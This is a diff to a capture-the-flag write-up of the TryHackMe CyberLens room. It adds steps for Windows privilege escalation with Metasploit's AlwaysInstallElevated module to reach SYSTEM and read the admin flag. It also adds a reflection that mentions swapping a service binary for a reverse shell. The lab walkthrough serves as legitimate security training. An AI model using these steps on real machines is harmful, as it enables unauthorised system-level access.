@@ -218,11 +218,34 @@ Then `bg` that session and type `use exploit/windows/local/always_install_elevat
 
 ![AlwaysInstallElevated Exploit](https://i.imgur.com/QWhWeN3.png)
 
-![](https://i.imgur.com/iaY5jiw.png)
+Set the `options` for the exploit and `run`:
+- `set LHOST $YOUR_IP`
+- `set SESSION 1`
 
-![](https://i.imgur.com/LfNUgUb.png)
+![AlwaysInstallElevated Exploit Options](https://i.imgur.com/iaY5jiw.png)
 
-![](https://i.imgur.com/RQWAVPO.png)
+And look at that, `authority\system` user.
+
+It's as good as being root on Linux... I think.
+
+![AlwaysInstallElevated Exploit Running](https://i.imgur.com/LfNUgUb.png)
+
+Then `cat C:\Users\Administrator\Desktop\admin.txt` for the admin flag.
+
+![Admin Flag](https://i.imgur.com/RQWAVPO.png)
+
+## Reflection & Rabbit Holes
+
+CyberLens has been a great room, props to Tyler and TryHackMe.
+
+It's Easy rated, but the priv esc portion really stumped me.
+
+I went down a few Rabbit Holes:
+- RDP led me replacing `C:\Apache24\bin\httpd.exe` with a reverse shell. Then using a startup.bat which using a Visual Basics script to run `httpd.exe`.
+- I thought I found a **Windows 17763** exploit on **exploit.db**... nope. 
+- Then I followed [Windows 11 Privilege Escalation via UAC Bypass (GUI based)](https://www.pwndefend.com/2021/08/23/windows-11-privilege-escalation-via-uac-bypass-gui-based/)... again, nope.
+
+With more Linux priv esc experience, this was a good room for me.
 
 ---
 
